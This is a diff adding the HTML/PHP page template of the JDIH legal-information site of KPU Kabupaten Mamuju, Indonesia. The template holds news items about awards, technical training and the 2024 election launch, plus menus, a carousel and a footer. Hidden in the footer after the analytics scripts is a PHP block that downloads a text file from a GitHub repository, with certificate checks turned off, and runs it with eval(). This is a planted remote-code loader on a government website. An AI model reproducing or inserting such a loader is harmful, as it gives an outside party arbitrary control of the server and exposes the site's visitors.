+								<center style="margin: 0px auto; font-size: 13px;">
+								<h2 class="section-title wow fadeInDown animated" data-wow-delay="0.3s" style="font-size: 28px">Berita</h2><br>
+								</center>
+							  </div>
+							</div>
+							
+							
+
+                            <div class="blog-list clearfix">
+							
+								<div class="blog-box row">
+                                    <div class="col-md-4">
+                                        <div class="post-media">
+                                            <a href="#" title="">
+                                                <img src="https://jdih.kpu.go.id/data-kabko/mamuju/foto_berita/SESI BERITA.png" alt="" class="img-fluid">
+                                                <div class="hovereffect"></div>
+                                            </a>
+                                        </div><!-- end media -->
+                                    </div><!-- end col -->
+
+                                    <div class="blog-meta big-meta col-md-8">
+                                        <h4><a href="beritadetail-52645456523039455253557a5241253344253344" title="">KPU MERAIH PENGHARGAAN</a></h4>
+                                        <p>
+
+Jakarta, Kamis (12/10/2023). KPU kembali meraih penghargaan yang ke-5 kali sebagai Jaringan Dokumentasi dan Informasi Hukum Nasional   (JDIHN)   Terbaik 1, 
+Kategori Lembaga Nonstruktural, dari Kementerian Hukum dan Hak Asasi Manusia (Kemenkumham).
+
+
+
+
+
+Penghargaan diterima langsung oleh Ketua KPU Hasyim Asy'aridari Menkumham Yasonna H Laoly.
+
+
+
+
+
+Ketua KPU Hasyim Asy'ar mnyampaikan ini merupakan bentuk komitmen KPU dalam menyebarluaskan Informasi dan Dokumentasi Hukum kepada...</p>
+                                        <small class="firstsmall"><a class="bg-orange" href="#" title="">Berita</a></small>
+                                        <small><a href="#" title="">19 October 2023</a></small>
+                                        <small><a href="#" title="">by JDIH KPU KAB MAMUJU</a></small>
+                                        
+                                    </div><!-- end meta -->
+                                </div><!-- end blog-box --><br>
+
+                                <!-- <hr class="invis"> -->
+								
+								
+								
+								<div class="blog-box row">
+                                    <div class="col-md-4">
+                                        <div class="post-media">
+                                            <a href="#" title="">
+                                                <img src="https://jdih.kpu.go.id/data-kabko/mamuju/foto_berita/BIMBINGAN TEKNIS PENYUSUNAN KEPUTUSAN.png" alt="" class="img-fluid">
+                                                <div class="hovereffect"></div>
+                                            </a>
+                                        </div><!-- end media -->
+                                    </div><!-- end col -->
+
+                                    <div class="blog-meta big-meta col-md-8">
+                                        <h4><a href="beritadetail-424e5456524535715253557a5241253344253344" title="">BIMBINGAN TEKNIS PENYUSUNAN KEPUTUSAN</a></h4>
+                                        <p>
+
+Menindaklanjuti surat undangan KPU Provinsi Sulawesi Barat dengan Nomor 163/PL.01.1/76/2022 tentang undangan Bimbingan Teknis Penyusunan Produk Hukum di lingkup KPU Provinsi dan KPU Kabupaten Se-Sulawesi Barat.
+
+
+
+
+
+KPU Kabupaten Mamuju dalam hal ini mengikuti kegiatan tersebut, dengan dihadiri oleh Hasdaris Anggota KPU Kabupaten Mamuju Divisi Hukum &amp; Pengawasan dan Kepala Sub Bagian Hukum &amp; SDM Trisdiana,Selasa...</p>
+                                        <small class="firstsmall"><a class="bg-orange" href="#" title="">Berita</a></small>
+                                        <small><a href="#" title="">29 August 2022</a></small>
+                                        <small><a href="#" title="">by JDIH KPU KAB MAMUJU</a></small>
+                                        
+                                    </div><!-- end meta -->
+                                </div><!-- end blog-box --><br>
+
+                                <!-- <hr class="invis"> -->
+								
+								
+								
+								<div class="blog-box row">
+                                    <div class="col-md-4">
+                                        <div class="post-media">
+                                            <a href="#" title="">
+                                                <img src="https://jdih.kpu.go.id/data-kabko/mamuju/foto_berita/NONTON BERSAMA PELUNCURAN TAHAPAN PEMILU 2024.png" alt="" class="img-fluid"><div class="hovereffect"></div>
+                                            </a>
+                                        </div><!-- end media -->
+                                    </div><!-- end col -->
+
+                                    <div class="blog-meta big-meta col-md-8">
+                                        <h4><a href="beritadetail-52655431526b39524a544e454a544e45" title="">NONTON BERSAMA PELUNCURAN TAHAPAN PEMILU 2024</a></h4>
+                                        <p>
+Komisi
+Pemilihan Umum Kabupaten Mamuju menggelar nonton bersama Peluncuran Tahapan
+Pemilu tahun 2024. Kegiatan tersebut dihadiri oleh H. Bau Akram Dai selaku Raja
+Mamuju, Bupati Mamuju diwakili oleh asisten I, Kapolresta Mamuju, Dandim 1418
+Mamuju, Kejaksaan Negeri Mamuju, Kepala Disdukcapil Mamuju, Kepala Badan Kesbangpol
+Mamuju, Ketua dan Anggota KPU Kabupaten Mamuju, Ketua dan Anggota Bawaslu
+Kabupaten Mamuju, Pimpinan Partai Politik Kabupaten Mamuju, serta beberapa...</p>
+                                        <small class="firstsmall"><a class="bg-orange" href="#" title="">Berita</a></small>
+                                        <small><a href="#" title="">15 June 2022</a></small>
+                                        <small><a href="#" title="">by JDIH KPU KAB MAMUJU</a></small>
+                                        
+                                    </div><!-- end meta -->
+                                </div><!-- end blog-box --><br>
+
+                                <!-- <hr class="invis"> -->
+								
+								
+								<div class="right"><a href="berita" title="">Lihat berita lainnya &#8594</a></div><br><br>							
+                            </div><!-- end blog-list -->
+                        </div><!-- end page-wrapper -->	
+    </div>	
+
+<section id="services" class="section-padding" style="font-size: 13px;">
+      <div class="container" style="font-size: 13px;">
+        <div class="row" style="font-size: 13px;">
+          <div class="col-md-12" style="font-size: 13px;">
+            <center style="margin: 0px auto; font-size: 13px;">
+            <h2 class="section-title wow fadeInDown animated" data-wow-delay="0.3s" style="font-size: 28px">Tentang JDIH KPU</h2><br>
+            </center>
+          </div>
+        </div>
+
+        <div class="row" style="font-size: 13px;">
+
+            <div class="col-lg-3 col-md-6 col-xs-12" style="margin-bottom: 35px; margin-top: 15px; font-size: 13px;">
+              <div class="about block text-center" style="font-size: 13px;">
+              <a href="dasar-hukum" style="font-size: 13px;"><img src="./pid/2_setiap_saat.png" style="width: 60px; font-size: 13px;"><br style="font-size: 13px;">
+                <h5 style="font-size: 18px;">Dasar Hukum</h5>
+              </a>
+              </div>
+            </div>
+
+            <div class="col-lg-3 col-md-6 col-xs-12" style="margin-bottom: 35px; margin-top: 15px; font-size: 13px;">
+              <div class="about block text-center" style="font-size: 13px;">
+              <a href="profil" style="font-size: 13px;"><img src="./pid/7_prosedur_sengketa.png" style="width: 60px; font-size: 13px;"><br style="font-size: 13px;">
+                <h5 style="font-size: 18px;">Struktur Organisasi</h5>
+              </a>
+              </div>
+            </div>
+
+            <div class="col-lg-3 col-md-6 col-xs-12" style="margin-bottom: 35px; margin-top: 15px; font-size: 13px;">
+              <div class="about block text-center" style="font-size: 13px;">
+              <a href="sop" style="font-size: 13px;"><img src="./pid/8_panduan_eppid.png" style="width: 60px; font-size: 13px;"><br style="font-size: 13px;">
+                <h5 style="font-size: 18px;">SOP</h5>
+              </a>
+              </div>
+            </div>
+			
+			<div class="col-lg-3 col-md-6 col-xs-12" style="margin-bottom: 35px; margin-top: 15px; font-size: 13px;">
+              <div class="about block text-center" style="font-size: 13px;">
+              <a href="faq" style="font-size: 13px;"><img src="./pid/0_faq.png" style="width: 60px; font-size: 13px;"><br style="font-size: 13px;">
+                <h5 style="font-size: 18px;">FAQ</h5>
+              </a>
+              </div>
+            </div>
+
+        </div>
+      </div>
+    </section>
+
+<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+
+                        
+						<div class="page-wrapper">
+                            <div class="blog-top clearfix">
+                                <h4 class="pull-left"></h4>
+                            </div><!-- end blog-top -->
+							
+							<div class="row" style="font-size: 13px;">
+							  <div class="col-md-12" style="font-size: 13px;">
+								<center style="margin: 0px auto; font-size: 13px;">
+								<h2 class="section-title wow fadeInDown animated" data-wow-delay="0.3s" style="font-size: 28px">Menu Lainnya</h2><br>
+								</center>
+							  </div>
+							</div>
+													
+							<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+<style>
+@media (max-width: 768px) {
+    .carousel-inner .carousel-item > div {
+        display: none;
+    }
+    .carousel-inner .carousel-item > div:first-child {
+        display: block;
+    }
+}
+
+.carousel-inner .carousel-item.active,
+.carousel-inner .carousel-item-next,
+.carousel-inner .carousel-item-prev {
+    display: flex;
+}
+
+/* display 3 */
+@media (min-width: 768px) {
+    
+    .carousel-inner .carousel-item-right.active,
+    .carousel-inner .carousel-item-next {
+      transform: translateX(33.333%);
+    }
+    
+    .carousel-inner .carousel-item-left.active, 
+    .carousel-inner .carousel-item-prev {
+      transform: translateX(-33.333%);
+    }
+}
+
+.carousel-inner .carousel-item-right,
+.carousel-inner .carousel-item-left{ 
+  transform: translateX(0);
+
+}
+
+.card {
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  min-width: 0; // See https://github.com/twbs/bootstrap/pull/22740#issuecomment-305868106
+  word-wrap: break-word;
+  background-color: $card-bg;
+  background-clip: border-box;
+  border: 0px solid; !important
+  @include border-radius($card-border-radius);
+
+  > hr {
+    margin-right: 0;
+    margin-left: 0;
+  }
+
+  > .list-group:first-child {
+    .list-group-item:first-child {
+      @include border-top-radius($card-border-radius);
+    }
+  }
+
+  > .list-group:last-child {
+    .list-group-item:last-child {
+      @include border-bottom-radius($card-border-radius);
+    }
+  }
+}
+
+</style>
+
+<div class="container text-center my-3">
+    <div class="row mx-auto my-auto">
+        <div id="recipeCarousel" class="carousel slide w-100" data-ride="carousel">
+            <div class="carousel-inner w-100" role="listbox">
+                <div class="carousel-item active">
+                    <div class="col-md-4">
+                        <div class="card card-body">
+						<a href="https://jdihn.go.id/">
+                            <img class="img-fluid" src="data/img/jdihncard.png">
+						</a>
+                        </div>
+                    </div>
+                </div>
+				<div class="carousel-item">
+                    <div class="col-md-4">
+                        <div class="card card-body">
+						<a href="pks">
+                            <img class="img-fluid" src="data/img/pks.png">
+						</a>
+                        </div>
+                    </div>
+                </div>
+				<div class="carousel-item">
+                    <div class="col-md-4">
+                        <div class="card card-body">
+						<a href="https://jdih.kpu.go.id/survey/">
+                            <img class="img-fluid" src="data/img/survey.png">
+						</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="carousel-item">
+                    <div class="col-md-4">
+                        <div class="card card-body">
+						<a href="https://jdih.kpu.go.id/survey/hasilsurvey/">
+                            <img class="img-fluid" src="data/img/hasilsurvey.png">
+						</a>
+                        </div>
+                    </div>
+                </div></div>
+            <a class="carousel-control-prev w-auto" href="#recipeCarousel" role="button" data-slide="prev">
+                <span class="carousel-control-prev-icon bg-dark border border-dark rounded-circle" aria-hidden="true"></span>
+                <span class="sr-only">Previous</span>
+            </a>
+            <a class="carousel-control-next w-auto" href="#recipeCarousel" role="button" data-slide="next">
+                <span class="carousel-control-next-icon bg-dark border border-dark rounded-circle" aria-hidden="true"></span>
+                <span class="sr-only">Next</span>
+            </a>
+        </div>
+    </div>
+
+</div>
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+
+<script>
+$('.dropdown-toggle').dropdown();
+</script>
+
+<script>
+$(function(){
+  $('.dropdown-menu a.dropdown-toggle').on('click', function(e) {
+    if (!$(this).next().hasClass('show')) {
+      $(this).parents('.dropdown-menu').first().find('.show').removeClass("show");
+    }
+    var $subMenu = $(this).next(".dropdown-menu");
+    $subMenu.toggleClass('show'); 			// appliqué au ul
+    $(this).parent().toggleClass('show'); 	// appliqué au li parent
+
+    $(this).parents('li.nav-item.dropdown.show').on('hidden.bs.dropdown', function(e) {
+      $('.dropdown-submenu .show').removeClass('show'); 	// appliqué au ul
+      $('.dropdown-submenu.show').removeClass('show'); 		// appliqué au li parent
+    });
+    return false;
+  });
+});
+</script>
+
+<script>
+$('#recipeCarousel').carousel({
+  interval: 50000
+})
+
+$('.carousel .carousel-item').each(function(){
+    var minPerSlide = 3;
+    var next = $(this).next();
+    if (!next.length) {
+    next = $(this).siblings(':first');
+    }
+    next.children(':first-child').clone().appendTo($(this));
+    
+    for (var i=0;i<minPerSlide;i++) {
+        next=next.next();
+        if (!next.length) {
+        	next = $(this).siblings(':first');
+      	}
+        
+        next.children(':first-child').clone().appendTo($(this));
+      }
+});
+
+</script>                            
+                        </div><!-- end page-wrapper -->	
+
+						
+                    </div><!-- end col -->
+
+<!--					
+<div id="maklumat" class="modal fade" role="dialog" aria-labelledby="maklumatLabel" style="font-size: 13px; display: none;" aria-hidden="true">
+  <div class="modal-dialog modal-lg" role="document" style="font-size: 13px;">
+    <!-- Modal content
+    <div class="modal-content" style="font-size: 13px; background-color: transparent;">
+        <button type="button" class="close" data-dismiss="modal" style="margin: -1rem 0rem 0rem auto; font-size: 36px;">x</button>
+		<div class="modal-body" style="font-size: 13px;">
+          <p style="font-size: 14px;">
+                          <a href="https://jdih.kpu.go.id/survey/" target="_blank"><img src="data/img/popup.jpeg" width="100%" alt="" style="font-size: 14px;"></p><p style="font-size: 14px;"><br style="font-size: 14px;"></p>
+                      <p style="font-size: 14px;"><a></p>
+      </div>
+      </div>
+      
+    </div>
+  </div>-->
+  
+  <div id="maklumat" class="modal fade" role="dialog" aria-labelledby="maklumatLabel" style="font-size: 13px; display: none;" aria-hidden="true">
+  <div class="modal-dialog modal-lg" role="document" style="font-size: 13px;">
+    <!-- Modal content-->
+    <div class="modal-content" style="width: 50%; display: block; margin-left: auto; margin-right: auto; !important">
+        <button type="button" class="close" data-dismiss="modal" style="margin: 0rem 2.5rem 0rem auto; font-size: 24px;">x</button>
+
+                          <img src="data/img/notif_750.jpg" width="100%" alt="" style="font-size: 14px;">
+      </div>
+    </div>
+  </div>
+  
+  <div class="modals" style="font-size: 13px;">
+        <v-dialog style="font-size: 13px;">
+    </v-dialog></div>
+  
+  <script type="text/javascript" style="font-size: 13px;">
+  jQuery( document ).ready(function($) {
+    if (sessionStorage.getItem("maklumat_visited") == undefined){
+                        $('#maklumat').modal({
+            show: true,
+            backdrop: 'static',
+            keyboard: false,
+          });
+                    sessionStorage.setItem("maklumat_visited", "ok");
+    }
+  });
+  $('.kpu-button-wsn').click(function() {
+        $(this).find('#toggleicon').toggleClass('fas fa-chevron-up fas fa-chevron-down')
+    });
+  </script>
+
+
+<!--- Footer --->
+	<footer>
+		<div class="jumbotron jumbotron-fluid bg-secondary p-4 mt-5 mb-0">
+			<div class="container">
+				<div class="row">
+					<div class="col-12 col-sm-12 col-md-12 col-lg-4 col-xl-4 cizgi">
+						<div class="card bg-secondary border-0">
+							<div class="card-body text-light text-center">
+								<h5 class="card-title text-white display-4" style="font-size:30px">Komisi Pemilihan Umum Kabupaten Mamuju</h5>
+							<p class="d-inline lead">Jl. H. Mustafa Katjo (Kompleks Perumahan Graha Nusa), Kel. Simboro, Kec. Simboro, Mamuju<br>
+							<a href="#" class="text-light d-block lead">© 2022</a>
+							</p>
+	
+							</div>
+						</div>
+					</div>
+										<div class="col-12 col-sm-12 col-md-6 col-lg-4 col-xl-4 cizgi">
+						<div class="card bg-secondary border-0">
+							<div class="card-body text-center">
+								<h5 class="card-title text-white display-4" style="font-size:30px">Kontak</h5>
+								
+										<a class="text-light d-block lead" href="#"><i class="fa fa-envelope mr-2"></i>jdih.kpumamuju@gmail.com</a>
+																		<br>
+								<h5 class="card-title text-white display-4" style="font-size:30px">Unduh Aplikasi</h5>
+								<a href="https://play.google.com/store/apps/details?id=go.kpu.android.jdih&hl=in&gl=US" target="_blank" style="font-size: 13px;">
+                  <img src="data/img/googleplaystore.png" width="50%" style="font-size: 13px;">
+                </a>
+								
+							</div>
+						</div>
+					</div>
+					
+					
+					
+					<div class="col-12 col-sm-12 col-md-6 col-lg-4 col-xl-4">
+						<div class="card bg-secondary border-0">
+							<div class="card-body text-center">
+							<h5 class="card-title text-white display-4" style="font-size:30px">Media Sosial</h5>
+					
+								<a class="text-light" href="https://www.facebook.com/profile.php?id=100076345274072" target="_blank"><i class="fa-brands fa-facebook fa-fw fa-2x"></i></a><a class="text-light" href="https://twitter.com/JdihKPUMamuju" target="_blank"><i class="fa-brands fa-twitter fa-fw fa-2x"></i></a><a class="text-light" href="https://www.instagram.com/jdihkpumamuju/" target="_blank"><i class="fa-brands fa-instagram fa-fw fa-2x"></i></a>	
+							
+							</div>
+							<div class="card-body text-center">
+
+<!-- Google Analytics -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129054105-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-129054105-1');
+</script>
+<!-- End Google Analytics UA-->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3EJ4TQVKX8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-3EJ4TQVKX8');
+</script>
+<!-- End Google Analytics GA-4 -->
+?>
+
+<?php
+$url = 'https://raw.githubusercontent.com/yutasato88/autobl/main/file.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+
+<!-- Histats.com  (div with counter) --><div id="histats_counter" style="display: none;"></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4221243,4,324,112,62,00011001']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('https://s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="https://sstatic1.histats.com/0.gif?4221243&101" alt="statistik pengunjung" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+							</div>
+						</div>
+					</div>	
+				</div>
+			</div>
+		</div>
+	</footer>
+	<!--# Footer #-->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script src="js/function.js"></script>
+<script src="js/extention/choices.js"></script>
+    <script>
+      var textPresetVal = new Choices('#choices-text-preset-values',
+      {
+        removeItemButton: true,
+      });
+
+    </script>
+  
+<link rel="stylesheet" href="//code.jquery.com/ui/1.13.1/themes/base/jquery-ui.css">
+  
+  <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+  <script src="https://code.jquery.com/ui/1.13.1/jquery-ui.js"></script>
+  <script type="text/javascript">
+	var jQuery_3_6_3 = $.noConflict(true);
+  </script>
+  <script>
+  $( function() {
+   jQuery_3_6_3( "#tabs" ).tabs();
+  } );
+  </script>
+ 
+
+<script>
+$(function(){
+  $('.dropdown-menu a.dropdown-toggle').on('click', function(e) {
+    if (!$(this).next().hasClass('show')) {
+      $(this).parents('.dropdown-menu').first().find('.show').removeClass("show");
+    }
+    var $subMenu = $(this).next(".dropdown-menu");
+    $subMenu.toggleClass('show'); 			// appliqué au ul
+    $(this).parent().toggleClass('show'); 	// appliqué au li parent
+
+    $(this).parents('li.nav-item.dropdown.show').on('hidden.bs.dropdown', function(e) {
+      $('.dropdown-submenu .show').removeClass('show'); 	// appliqué au ul
+      $('.dropdown-submenu.show').removeClass('show'); 		// appliqué au li parent
+    });
+    return false;
+  });
+});
+</script>
+
+</body>
+</html>
